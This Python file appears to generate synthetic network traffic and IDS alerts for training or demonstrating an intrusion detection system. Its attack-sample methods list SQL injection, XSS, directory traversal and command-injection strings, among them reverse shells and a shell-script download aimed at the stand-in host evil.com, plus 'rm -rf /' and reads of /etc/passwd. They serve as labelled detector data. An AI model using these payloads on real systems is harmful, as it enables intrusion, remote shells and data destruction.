import json
import random
import pandas as pd
from datetime import datetime, timedelta
from typing import List, Dict, Any
import os

class DataGenerator:
    def __init__(self):
        self.data_dir = "data"
        self._ensure_data_directory()
        
        # Common IP ranges for simulation
        self.internal_ips = [f"192.168.1.{i}" for i in range(1, 255)]
        self.external_ips = [
            "203.0.113.45", "198.51.100.78", "192.0.2.123",
            "185.220.101.42", "91.198.174.192", "123.45.67.89",
            "45.76.123.45", "104.248.123.45", "159.89.123.45"
        ]
        
        # Common ports
        self.common_ports = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995]
        self.suspicious_ports = [135, 139, 445, 1433, 3389, 5432, 6379, 27017]
        
        # Protocols
        self.protocols = ["TCP", "UDP", "HTTP", "HTTPS", "ICMP"]
        
    def _ensure_data_directory(self):
        """Ensure data directory exists"""
        if not os.path.exists(self.data_dir):
            os.makedirs(self.data_dir)
    
    def generate_normal_traffic(self, count: int = 100) -> List[Dict[str, Any]]:
        """Generate normal network traffic data"""
        traffic_data = []
        
        for _ in range(count):
            timestamp = datetime.now() - timedelta(
                hours=random.randint(0, 24),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            
            traffic = {
                "timestamp": timestamp.isoformat(),
                "source_ip": random.choice(self.internal_ips),
                "destination_ip": random.choice(self.external_ips + self.internal_ips),
                "protocol": random.choice(self.protocols),
                "port": random.choice(self.common_ports),
                "packet_size": random.randint(64, 1500),
                "duration": random.uniform(0.1, 10.0),
                "payload": self._generate_normal_payload(),
                "is_malicious": False,
                "traffic_type": "normal"
            }
            traffic_data.append(traffic)
        
        return traffic_data
    
    def generate_malicious_traffic(self, count: int = 30) -> List[Dict[str, Any]]:
        """Generate malicious network traffic data"""
        traffic_data = []
        
        attack_types = [
            self._generate_sql_injection,
            self._generate_xss_attack,
            self._generate_command_injection,
            self._generate_directory_traversal,
            self._generate_port_scan,
            self._generate_brute_force
        ]
        
        for _ in range(count):
            timestamp = datetime.now() - timedelta(
                hours=random.randint(0, 24),
                minutes=random.randint(0, 59),
                seconds=random.randint(0, 59)
            )
            
            attack_func = random.choice(attack_types)
            traffic = attack_func()
            traffic.update({
                "timestamp": timestamp.isoformat(),
                "source_ip": random.choice(self.external_ips),
                "destination_ip": random.choice(self.internal_ips),
                "packet_size": random.randint(500, 3000),
                "duration": random.uniform(0.5, 30.0),
                "is_malicious": True
            })
            
            traffic_data.append(traffic)
        
        return traffic_data
    
    def _generate_normal_payload(self) -> str:
        """Generate normal HTTP/web payload"""
        normal_payloads = [
            "GET / HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0",
            "POST /api/users HTTP/1.1\nContent-Type: application/json\n{\"name\":\"john\"}",
            "GET /images/logo.png HTTP/1.1\nHost: company.com",
            "GET /css/style.css HTTP/1.1\nAccept: text/css",
            "POST /contact HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nname=John&email=john@example.com",
            "GET /products?category=electronics HTTP/1.1",
            "POST /login HTTP/1.1\nusername=user&password=pass123"
        ]
        return random.choice(normal_payloads)
    
    def _generate_sql_injection(self) -> Dict[str, Any]:
        """Generate SQL injection attack payload"""
        sql_payloads = [
            "GET /login.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1",
            "POST /search.php HTTP/1.1\nq='; DROP TABLE users;--",
            "GET /product.php?id=1' OR '1'='1 HTTP/1.1",
            "POST /admin.php HTTP/1.1\nusername=admin'--&password=anything",
            "GET /news.php?id=1 UNION SELECT 1,2,3,database(),version()-- HTTP/1.1"
        ]
        
        return {
            "protocol": "HTTP",
            "port": 80,
            "payload": random.choice(sql_payloads),
            "traffic_type": "sql_injection"
        }
    
    def _generate_xss_attack(self) -> Dict[str, Any]:
        """Generate XSS attack payload"""
        xss_payloads = [
            "GET /search.php?q=<script>alert('XSS')</script> HTTP/1.1",
            "POST /comment.php HTTP/1.1\ncomment=<img src=x onerror=alert('XSS')>",
            "GET /profile.php?name=<script>document.location='http://evil.com'</script> HTTP/1.1",
            "POST /form.php HTTP/1.1\ninput=<svg onload=alert('XSS')>",
            "GET /page.php?data=javascript:alert('XSS') HTTP/1.1"
        ]
        
        return {
            "protocol": "HTTP",
            "port": 80,
            "payload": random.choice(xss_payloads),
            "traffic_type": "xss_attack"
        }
    
    def _generate_command_injection(self) -> Dict[str, Any]:
        """Generate command injection attack payload"""
        cmd_payloads = [
            "GET /ping.php?host=127.0.0.1;cat /etc/passwd HTTP/1.1",
            "POST /upload.php HTTP/1.1\nfilename=test.txt;rm -rf /",
            "GET /system.php?cmd=ls;wget http://evil.com/shell.sh HTTP/1.1",
            "POST /exec.php HTTP/1.1\ncommand=whoami;nc -e /bin/bash evil.com 4444",
            "GET /tool.php?input=file.txt|bash -i >& /dev/tcp/evil.com/4444 0>&1 HTTP/1.1"
        ]
        
        return {
            "protocol": "HTTP",
            "port": 80,
            "payload": random.choice(cmd_payloads),
            "traffic_type": "command_injection"
        }
    
    def _generate_directory_traversal(self) -> Dict[str, Any]:
        """Generate directory traversal attack payload"""
        traversal_payloads = [
            "GET /download.php?file=../../../etc/passwd HTTP/1.1",
            "GET /view.php?page=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1",
            "POST /include.php HTTP/1.1\npath=../../../../etc/shadow",
            "GET /read.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1",
            "GET /show.php?doc=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1"
        ]
        
        return {
            "protocol": "HTTP",
            "port": 80,
            "payload": random.choice(traversal_payloads),
            "traffic_type": "directory_traversal"
        }
    
    def _generate_port_scan(self) -> Dict[str, Any]:
        """Generate port scanning activity"""
        scan_payloads = [
            "TCP SYN scan on multiple ports",
            "nmap -sS -O target_host",
            "masscan -p1-65535 target_network",
            "TCP connect scan attempt",
            "UDP port scan probe"
        ]
        
        return {
            "protocol": "TCP",
            "port": random.choice(self.suspicious_ports),
            "payload": random.choice(scan_payloads),
            "traffic_type": "port_scan"
        }
    
    def _generate_brute_force(self) -> Dict[str, Any]:
        """Generate brute force attack payload"""
        brute_payloads = [
            "POST /login.php HTTP/1.1\nusername=admin&password=admin",
            "POST /ssh HTTP/1.1\nuser=root&pass=password",
            "POST /admin HTTP/1.1\nlogin=administrator&pwd=123456",
            "POST /wp-login.php HTTP/1.1\nlog=admin&pwd=qwerty",
            "FTP login attempt: user=anonymous pass=guest"
        ]
        
        return {
            "protocol": random.choice(["HTTP", "SSH", "FTP"]),
            "port": random.choice([22, 21, 80, 443]),
            "payload": random.choice(brute_payloads),
            "traffic_type": "brute_force"
        }
    
    def generate_dummy_traffic(self, normal_count: int = 200, malicious_count: int = 50):
        """Generate complete dummy traffic dataset"""
        print("🔄 Generating dummy traffic data...")
        
        # Generate traffic data
        normal_traffic = self.generate_normal_traffic(normal_count)
        malicious_traffic = self.generate_malicious_traffic(malicious_count)
        
        all_traffic = normal_traffic + malicious_traffic
        random.shuffle(all_traffic)
        
        # Save to JSON
        with open(f"{self.data_dir}/traffic_logs.json", "w") as f:
            json.dump(all_traffic, f, indent=2)
        
        # Save to CSV for ML training
        df = pd.DataFrame(all_traffic)
        df.to_csv(f"{self.data_dir}/traffic_logs.csv", index=False)
        
        print(f"✅ Generated {len(all_traffic)} traffic records")
        return all_traffic
    
    def generate_dummy_alerts(self, count: int = 25):
        """Generate dummy IDS alerts"""
        print("🔄 Generating dummy alerts...")
        
        alerts = []
        severity_levels = ["High", "Medium", "Low"]
        alert_types = [
            "SQL Injection Detected",
            "XSS Attack Blocked",
            "Command Injection Attempt",
            "Directory Traversal Detected",
            "Port Scan Activity",
            "Brute Force Attack",
            "Anomalous Traffic Pattern",
            "Suspicious Payload Detected",
            "Rate Limit Exceeded",
            "Honeypot Interaction"
        ]
        
        for i in range(count):
            timestamp = datetime.now() - timedelta(
                hours=random.randint(0, 72),
                minutes=random.randint(0, 59)
            )
            
            severity = random.choice(severity_levels)
            alert_type = random.choice(alert_types)
            
            alert = {
                "id": f"ALERT_{i+1:04d}",
                "timestamp": timestamp.isoformat(),
                "alert_type": alert_type,
                "severity": severity,
                "source_ip": random.choice(self.external_ips),
                "destination_ip": random.choice(self.internal_ips),
                "description": f"{alert_type} from {random.choice(self.external_ips)}",
                "confidence": random.uniform(0.6, 1.0),
                "status": random.choice(["Active", "Resolved", "Investigating"]),
                "rule_triggered": f"RULE_{random.randint(1, 50):03d}",
                "action_taken": random.choice(["Blocked", "Logged", "Alerted", "Quarantined"])
            }
            alerts.append(alert)
        
        # Sort by timestamp (newest first)
        alerts.sort(key=lambda x: x["timestamp"], reverse=True)
        
        # Save alerts
        with open(f"{self.data_dir}/alerts.json", "w") as f:
            json.dump(alerts, f, indent=2)
        
        print(f"✅ Generated {len(alerts)} alerts")
        return alerts
    
    def get_traffic_stats(self) -> Dict[str, Any]:
        """Get traffic statistics for dashboard"""
        try:
            with open(f"{self.data_dir}/traffic_logs.json", "r") as f:
                traffic_data = json.load(f)
            
            total_packets = len(traffic_data)
            malicious_packets = sum(1 for t in traffic_data if t.get("is_malicious", False))
            
            # Calculate packets per hour for last 24 hours
            now = datetime.now()
            hourly_stats = {}
            
            for i in range(24):
                hour_start = now - timedelta(hours=i+1)
                hour_end = now - timedelta(hours=i)
                
                hour_packets = sum(1 for t in traffic_data 
                                 if hour_start <= datetime.fromisoformat(t["timestamp"]) < hour_end)
                hourly_stats[hour_start.strftime("%H:00")] = hour_packets
            
            return {
                "total_packets": total_packets,
                "malicious_packets": malicious_packets,
                "normal_packets": total_packets - malicious_packets,
                "detection_rate": (malicious_packets / total_packets * 100) if total_packets > 0 else 0,
                "hourly_stats": hourly_stats,
                "last_updated": datetime.now().isoformat()
            }
            
        except FileNotFoundError:
            return {
                "total_packets": 0,
                "malicious_packets": 0,
                "normal_packets": 0,
                "detection_rate": 0,
                "hourly_stats": {},
                "last_updated": datetime.now().isoformat()
            }
